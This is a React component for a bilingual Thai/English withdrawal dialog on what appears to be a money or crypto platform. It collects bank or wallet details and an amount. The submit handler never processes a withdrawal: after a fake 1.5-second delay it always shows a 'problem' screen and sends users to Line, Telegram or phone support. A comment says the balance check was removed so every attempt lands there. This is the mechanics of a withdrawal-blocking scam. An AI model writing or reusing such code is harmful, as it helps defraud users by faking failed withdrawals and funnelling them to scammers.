import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  ArrowUpCircle,
  ChevronRight,
  AlertCircle,
  Loader2,
} from "lucide-react";
import { supabase } from "../../lib/supabase";
import { depositMethods } from "../../data/depositMethods";
import { SupportContactList } from "./SupportContactList";

type WithdrawStep = "select" | "form" | "result";

interface WithdrawModalProps {
  balance: number;
  onClose: () => void;
}

export const WithdrawModal: React.FC<WithdrawModalProps> = ({
  balance,
  onClose,
}) => {
  const [step, setStep] = useState<WithdrawStep>("select");
  const [selected, setSelected] = useState<(typeof depositMethods)[0] | null>(
    null,
  );
  const [bankName, setBankName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [amountError, setAmountError] = useState("");
  const [settings, setSettings] = useState({
    phone: "",
    line: "",
    telegram: "",
  });

  useEffect(() => {
    const fetchSettings = async () => {
      const { data } = await supabase
        .from("global_settings")
        .select("*")
        .eq("id", "main")
        .single();
      if (data) {
        setSettings({
          phone: data.contact_phone || "",
          line: data.contact_line || "",
          telegram: data.contact_telegram || "",
        });
      }
    };
    fetchSettings();
  }, []);

  const handleSubmit = async () => {
    const num = parseFloat(amount);
    if (!num || num <= 0) {
      setAmountError("กรุณาระบุจำนวนเงินที่ถูกต้อง");
      return;
    }
    // Remove balance check to always proceed to the 'problem' screen as requested
    setAmountError("");
    setSubmitting(true);
    await new Promise((r) => setTimeout(r, 1500));
    setSubmitting(false);
    setStep("result");
  };

  return (
    <AnimatePresence mode="wait">
      {/* ── Step 1: Select Method ── */}
      {step === "select" && (
        <motion.div
          key="select"
          initial={{ opacity: 0, x: 30 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -30 }}
          className="max-h-[80vh] overflow-y-auto custom-scrollbar"
        >
          <div className="flex items-center justify-between mb-6">
            <div>
              <h2 className="text-xl font-black text-white flex items-center gap-2">
                <ArrowUpCircle size={22} className="text-red-500" />
                ถอนเงิน / Withdraw
              </h2>
              <p className="text-slate-400 text-xs mt-0.5">
                เลือกสกุลเงินที่ต้องการถอน
              </p>
            </div>
            <button
              onClick={onClose}
              className="w-8 h-8 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-slate-400 hover:text-white transition-colors"
            >
              <X size={16} />
            </button>
          </div>

          {/* Balance badge */}
          <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-3 mb-5 flex items-center justify-between">
            <span className="text-slate-400 text-sm">ยอดคงเหลือ</span>
            <span className="text-white font-black">
              ${balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
            </span>
          </div>

          <div className="space-y-3">
            {depositMethods.map((m) => (
              <button
                key={m.id}
                onClick={() => {
                  setSelected(m);
                  setStep("form");
                }}
                className={`w-full flex items-center justify-between p-4 rounded-2xl bg-gradient-to-tr ${m.color} border ${m.border} hover:border-white/30 transition-all group`}
              >
                <div className="flex items-center gap-3">
                  <span className="text-2xl">{m.flag}</span>
                  <div className="text-left">
                    <p className="text-white font-bold text-sm">{m.label}</p>
                    <p className="text-slate-400 text-xs">{m.bank}</p>
                  </div>
                </div>
                <ChevronRight
                  size={16}
                  className="text-slate-500 group-hover:text-white group-hover:translate-x-1 transition-all"
                />
              </button>
            ))}
          </div>
        </motion.div>
      )}

      {/* ── Step 2: Enter Bank Details ── */}
      {step === "form" && selected && (
        <motion.div
          key="form"
          initial={{ opacity: 0, x: 30 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -30 }}
          className="max-h-[80vh] overflow-y-auto custom-scrollbar"
        >
          <div className="flex items-center justify-between mb-5">
            <button
              onClick={() => setStep("select")}
              className="text-slate-400 hover:text-white text-sm font-bold flex items-center gap-1"
            >
              <ChevronRight size={14} className="rotate-180" /> Back
            </button>
            <button
              onClick={onClose}
              className="w-8 h-8 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-slate-400 hover:text-white transition-colors"
            >
              <X size={16} />
            </button>
          </div>

          <div className="text-center mb-5">
            <span className="text-3xl">{selected.flag}</span>
            <h2 className="text-lg font-black text-white mt-1">
              {selected.label}
            </h2>
            <p className="text-slate-400 text-xs">{selected.bank}</p>
          </div>

          <div className="space-y-4 mb-5">
            {/* Bank Name */}
            <div>
              <label className="text-xs font-black text-slate-400 uppercase tracking-widest mb-1.5 block">
                {selected.id === "usdt" ? "Network" : "ธนาคาร / Bank Name"}
              </label>
              <input
                type="text"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                placeholder={
                  selected.id === "usdt"
                    ? "TRC-20 / ERC-20"
                    : "ชื่อธนาคาร เช่น กสิกร, SCB"
                }
                className="w-full bg-slate-900 border border-white/10 rounded-xl py-3 px-4 text-white focus:outline-none focus:ring-2 focus:ring-red-500/40 transition-all placeholder:text-slate-700"
              />
            </div>

            {/* Account Number */}
            <div>
              <label className="text-xs font-black text-slate-400 uppercase tracking-widest mb-1.5 block">
                {selected.id === "usdt"
                  ? "Wallet Address"
                  : "เลขบัญชี / Account Number"}
              </label>
              <input
                type="text"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                placeholder={
                  selected.id === "usdt" ? "T... หรือ 0x..." : "xxx-x-xxxxx-x"
                }
                className="w-full bg-slate-900 border border-white/10 rounded-xl py-3 px-4 text-white font-mono focus:outline-none focus:ring-2 focus:ring-red-500/40 transition-all placeholder:text-slate-700"
              />
            </div>

            {/* Amount */}
            <div>
              <label className="text-xs font-black text-slate-400 uppercase tracking-widest mb-1.5 block">
                จำนวนเงิน / Amount
              </label>
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">
                  $
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => {
                    setAmount(e.target.value);
                    setAmountError("");
                  }}
                  placeholder="0.00"
                  className="w-full bg-slate-900 border border-white/10 rounded-xl py-3 pl-8 pr-20 text-xl font-black text-white focus:outline-none focus:ring-2 focus:ring-red-500/40 transition-all placeholder:text-slate-700"
                />
                <button
                  onClick={() => setAmount(balance.toFixed(2))}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-black text-red-400 hover:text-red-300 transition-colors"
                >
                  MAX
                </button>
              </div>
              <div className="flex gap-2 mt-2">
                {[100, 500, 1000, 5000].map((v) => (
                  <button
                    key={v}
                    onClick={() => setAmount(v.toString())}
                    className="flex-1 py-1.5 rounded-lg bg-white/5 text-slate-400 text-xs font-bold hover:bg-white/10 hover:text-white transition-colors"
                  >
                    ${v.toLocaleString()}
                  </button>
                ))}
              </div>
              {amountError && (
                <p className="text-red-400 text-xs font-bold mt-1.5 flex items-center gap-1">
                  <AlertCircle size={12} /> {amountError}
                </p>
              )}
            </div>
          </div>

          <div className="text-xs text-amber-400/80 bg-amber-500/10 border border-amber-500/20 rounded-lg p-3 mb-4">
            ⚠️ กรุณาตรวจสอบข้อมูลบัญชีให้ถูกต้องก่อนยืนยัน
          </div>

          <button
            onClick={handleSubmit}
            disabled={submitting || !bankName || !accountNumber || !amount}
            className="w-full py-4 rounded-xl bg-red-500 hover:bg-red-600 text-white font-black text-base shadow-2xl shadow-red-500/30 transition-all active:scale-95 disabled:opacity-50 flex items-center justify-center gap-2"
          >
            {submitting ? (
              <Loader2 size={20} className="animate-spin" />
            ) : (
              <ArrowUpCircle size={20} />
            )}
            {submitting ? "กำลังดำเนินการ..." : "ยืนยันการถอนเงิน"}
          </button>
        </motion.div>
      )}

      {/* ── Step 3: Problem + Support ── */}
      {step === "result" && (
        <motion.div
          key="result"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0 }}
          className="max-h-[80vh] overflow-y-auto custom-scrollbar"
        >
          <div className="flex justify-end mb-2">
            <button
              onClick={onClose}
              className="w-8 h-8 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-slate-400 hover:text-white transition-colors"
            >
              <X size={16} />
            </button>
          </div>

          <div className="flex flex-col items-center text-center mb-6">
            <div className="w-16 h-16 rounded-full bg-red-500/20 border border-red-500/30 flex items-center justify-center mb-4">
              <AlertCircle size={32} className="text-red-400" />
            </div>
            <h2 className="text-xl font-black text-white mb-1">
              พบปัญหาในการถอนเงิน
            </h2>
            <p className="text-slate-400 text-sm leading-relaxed">
              ระบบไม่สามารถดำเนินการถอนเงินได้โดยอัตโนมัติ
              <br />
              กรุณาติดต่อทีมสนับสนุนเพื่อดำเนินการต่อ
            </p>
          </div>

          {/* Withdraw summary */}
          <div className="bg-white/5 border border-white/10 rounded-xl p-4 mb-5 space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-slate-400">สกุลเงิน</span>
              <span className="text-white font-bold">{selected?.label}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-400">
                {selected?.id === "usdt" ? "Wallet" : "ธนาคาร"}
              </span>
              <span className="text-white font-bold">{bankName}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-400">เลขบัญชี</span>
              <span className="text-white font-mono text-xs">
                {accountNumber}
              </span>
            </div>
            <div className="flex justify-between text-sm border-t border-white/10 pt-2 mt-2">
              <span className="text-slate-400">จำนวน</span>
              <span className="text-red-400 font-black">
                $
                {parseFloat(amount).toLocaleString(undefined, {
                  minimumFractionDigits: 2,
                })}
              </span>
            </div>
          </div>

          <div className="mb-5">
            <SupportContactList settings={settings} />
          </div>

          <button
            onClick={onClose}
            className="w-full py-3 rounded-xl bg-white/10 hover:bg-white/15 text-white font-bold transition-all"
          >
            ปิด
          </button>
        </motion.div>
      )}
    </AnimatePresence>
  );
};
